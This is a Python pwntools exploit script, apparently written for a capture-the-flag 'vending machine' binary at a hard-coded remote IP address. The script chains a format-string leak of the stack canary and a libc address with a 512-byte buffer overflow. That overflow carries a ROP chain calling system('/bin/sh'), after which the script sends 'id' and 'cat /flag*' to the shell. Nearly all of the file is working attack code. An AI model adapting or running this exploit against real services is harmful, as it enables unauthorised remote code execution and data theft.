#!/usr/bin/env python3
"""
Exploit for vending machine - remote 39.96.193.120:33334

Key findings:
- Canary at format position 45 (%45$p) - LEAKS CORRECTLY
- Libc via %10$s from printf@GOT (0x404028) - LEAKS CORRECTLY
- positional %n ($) writes DISABLED on remote glibc
- Product buffer overflow via quantity=512 (al=0, passes jbe check)
- Correct canary at offset 264 bypasses stack protection
- Return address at offset 280 -> ROP chain

Required fix: all data (format+qty+overflow) must arrive before scanf's
stdio buffer consumes the overflow. Send everything in ONE shot.
"""
from pwn import *
context.arch = 'amd64'
context.log_level = 'info'

PRINTF_GOT = 0x404028
LIBC_PRINTF_OFF = 0x61c90
LIBC_SYSTEM_OFF = 0x52290
LIBC_POP_RDI    = 0x23b6a
LIBC_BINSH_OFF  = 0x1b45bd

def exploit():
    io = remote('39.96.193.120', 33334)

    # === ITER 1: Leak canary + libc ===
    io.recvuntil(b'ID:')
    io.send(b'%45$p%10$s' + b'A' * 6 + p64(PRINTF_GOT) + b'\n')
    io.recvuntil(b'Welcome, ')
    raw = io.recvuntil(b'quantity', drop=True)
    canary_val = int(raw[:18], 16)
    libc_bytes = raw[18:24]
    printf_addr = u64(libc_bytes[:6].ljust(8, b'\x00'))
    libc_base = printf_addr - LIBC_PRINTF_OFF
    system_addr = libc_base + LIBC_SYSTEM_OFF
    pop_rdi = libc_base + LIBC_POP_RDI
    binsh_addr = libc_base + LIBC_BINSH_OFF
    canary = p64(canary_val)
    log.success(f"canary:{hex(canary_val)} libc:{hex(libc_base)} system:{hex(system_addr)}")
    io.send(b'1\n'); io.recvuntil(b'product'); io.send(b'A\n')

    # === ITER 2: Send ALL data (format+qty+overflow) in ONE TCP send ===
    io.recvuntil(b'ID:')

    # Build overflow with CORRECT canary at offset 264 and ROP at offset 280
    overflow = b'A' * 264 + canary + b'B' * 8
    overflow += p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
    overflow += b'C' * (512 - len(overflow))
    assert len(overflow) == 512

    # Send format (31 bytes) + quantity (4 bytes) + overflow (512 bytes) = 547 bytes
    # Read(0, id_buf, 31) gets first 31 bytes. scanf+getchar get next 4 bytes.
    # Then direct read(0, buf, 512) gets the overflow IF it wasn't buffered by scanf.
    #
    # The stdio buffer issue: scanf's internal read may consume overflow bytes.
    # Adding TCP_NODELAY + sending all at once helps.
    customer_id = b'Z' * 30 + b'\n'
    quantity   = b'512\n'
    all_data = customer_id + quantity + overflow

    import socket
    io.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    io.sock.sendall(all_data)
    log.info(f"Sent {len(all_data)} bytes in one TCP send")

    import time; time.sleep(1.5)
    try:
        out = io.recvall(timeout=5)
        if b'uid=' in out or b'PWNED' in out or b'flag' in out.lower():
            log.success("SHELL!")
            print(out.decode(errors='replace'))
        elif b'stack smashing' in out:
            log.warning("Stack smashing - canary at 264 reached but ROP not triggered")
        elif b'Order confirmed!' in out:
            count = out.count(b'Order confirmed!')
            log.info(f"Order confirmed count: {count} (expect 0-1 if ROP executed)")
            print(out.decode(errors='replace')[:500])
    except:
        pass

    try:
        io.sendline(b'id')
        io.sendline(b'cat /flag*')
        out = io.recvall(timeout=3)
        if out: print(out.decode(errors='replace'))
    except:
        pass
    io.close()

if __name__ == '__main__':
    exploit()
